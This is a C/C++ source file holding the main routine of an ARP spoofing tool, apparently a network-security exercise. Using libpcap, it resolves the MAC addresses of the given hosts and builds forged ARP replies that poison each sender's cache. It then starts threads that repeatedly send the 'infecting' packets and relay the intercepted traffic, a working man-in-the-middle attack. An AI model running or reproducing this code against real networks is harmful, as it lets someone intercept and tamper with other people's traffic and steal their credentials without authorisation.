#include "arp_spoofing.h"

void usage() {
    printf("syntax: arp_spoofing <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: arp_spoofing wlx1cbfceb4b530 192.168.0.15 192.168.0.1\n");
}

int main (int argc, char *argv[], char *envp[]) {
    pcap_t *pcap;
    char errbuf[PCAP_ERRBUF_SIZE];
    char *iface = argv[1];
    uint32_t *sender_ip = NULL;
    uint32_t *target_ip = NULL;
    uint8_t my_mac[6];
    uint8_t **g_mac;
    uint32_t my_ip;
    int i, j;
    int loop;
    struct pcap_pkthdr* header;
    const uint8_t *data;
    arp *packet;
    arp *send;
    arp **infecting;

    setvbuf(stdout, 0LL, 1, 0LL);
    setvbuf(stderr, 0LL, 1, 0LL);
    if(argc < 4 || argc % 2) {
        usage();
        return -1;
    }
    loop = (argc - 2) / 2;
    sender_ip = (uint32_t*)malloc(sizeof(uint32_t) * loop);
    target_ip = (uint32_t*)malloc(sizeof(uint32_t) * loop);
    g_mac = (uint8_t **)malloc(sizeof(uint8_t*) * loop);
    infecting = (arp**)malloc(sizeof(arp*) * loop);
    if(!sender_ip || !target_ip || !infecting || !g_mac) {
        fprintf(stderr, "Malloc error.\n");
        return -1;
    }
    for (i = 0; i < loop; ++i) {
        infecting[i] = (arp*)malloc(sizeof(arp) + 1);
        g_mac[i] = (uint8_t*)malloc(sizeof(uint8_t)*6 + 1);
        if(!infecting[i] || !g_mac[i]) {
            fprintf(stderr, "Malloc error.\n");
            return -1;
        }
        memset(infecting[i], '\0', sizeof(arp));
        sender_ip[i] = inet_addr(argv[i * 2 + 2]);
        target_ip[i] = inet_addr(argv[i * 2 + 3]);
    }

    pcap = pcap_open_live(iface, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", iface, errbuf);
        return -1;
    }

    send = (arp*)malloc(sizeof(arp) + 0x10);
    if(get_my_mac(iface, my_mac)) {
        fprintf(stderr, "Can't get my mac address :(\n");
        return -1;
    }
    if(get_my_ip(iface, &my_ip)) {
        fprintf(stderr, "Can't get my ip address :(\n");
        return -1;
    }

    printf("MY MAC ADDRESS: %02x:%02x:%02x:%02x:%02x:%02x\n", my_mac[0], my_mac[1], my_mac[2], my_mac[3], my_mac[4], my_mac[5]);
    printf("MY IP  ADDRESS: %d.%d.%d.%d\n", my_ip & 0xff, my_ip >> 8 & 0xff, my_ip >> 16 & 0xff, my_ip >> 24 & 0xff);
    
    for(i = 0; i < loop; ++i) {
        set_arp(send, my_mac, (uint8_t*)"\xff\xff\xff\xff\xff\xff", REQUEST, 
            my_mac, my_ip, (uint8_t*)"\0\0\0\0\0\0", target_ip[i]);
        packet = resolve_target_arp(pcap, &header, &data, send);
        if(!packet) {
            fprintf(stderr, "Can't resolve target arp packet :(\n");
            return -1;
        }
        memcpy(g_mac[i], packet->sender_mac, 6);
    }
    for(i = 0; i < loop; ++i) {
        set_arp(send, my_mac, (uint8_t*)"\xff\xff\xff\xff\xff\xff", REQUEST, 
            my_mac, my_ip, (uint8_t*)"\0\0\0\0\0\0", sender_ip[i]);
        packet = resolve_target_arp(pcap, &header, &data, send);
        if(!packet) {
            fprintf(stderr, "Can't resolve target arp packet :(\n");
            return -1;
        }
        set_arp(infecting[i], my_mac, packet->sender_mac, REPLY, my_mac, 
                    target_ip[i], packet->sender_mac, sender_ip[i]);
    }
    std::thread inf_th = std::thread(infecting_routine, pcap, loop, infecting);
    std::thread relay_th = std::thread(relay_routine, pcap, loop, infecting,
        sender_ip, my_mac, g_mac, my_ip);
    signal(SIGINT, (__sighandler_t)handler);
    inf_th.join();
    relay_th.join();
}

